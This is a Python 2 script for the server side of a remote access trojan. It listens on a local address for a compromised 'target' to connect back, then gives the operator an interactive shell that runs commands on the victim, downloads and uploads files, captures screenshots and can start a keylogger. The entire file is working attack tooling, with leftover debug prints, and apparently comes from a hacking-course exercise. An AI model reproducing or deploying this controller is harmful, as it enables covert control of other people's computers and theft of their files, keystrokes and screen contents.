#!/usr/bin/python
import socket
import json
import base64

count = 1

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	global count
	while True:
		command =  raw_input("* Shell#~%s: " % str(ip))
		reliable_send(command)
		if command == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
		elif command[:12] == "keylog_start":
			continue

		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				result = reliable_recv()
				file.write(base64.b64decode(result))
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					reliable_send(base64.b64encode(fin.read()))
			except:
				failed = "failed to upload"
				reliable_send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
			try:
				with open("screenshot%d" % count, "wb") as screen:
					hh = open("im.txt", "wb")
					imagestr = reliable_recv()
					hh.write(imagestr)
					print imagestr
					hh.close()
					print "11"
					image_dec = base64.b64decode(imagestr)
					print image_dec
					print "12"
					if image_dec[:4] == "[!!]":
						print(image_dec)
					else:
						screen.write(image_dec)
						count += 1
						print "jjjj"
			except TypeError:
				print("FAiled")

		else:
			result = reliable_recv()
			print(result)
def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("192.168.126.138",54321))
	s.listen(5)
	print("Listening For incoming Connection")
	target, ip = s.accept()
	print("Target connected!")

server()
shell()
s.close()

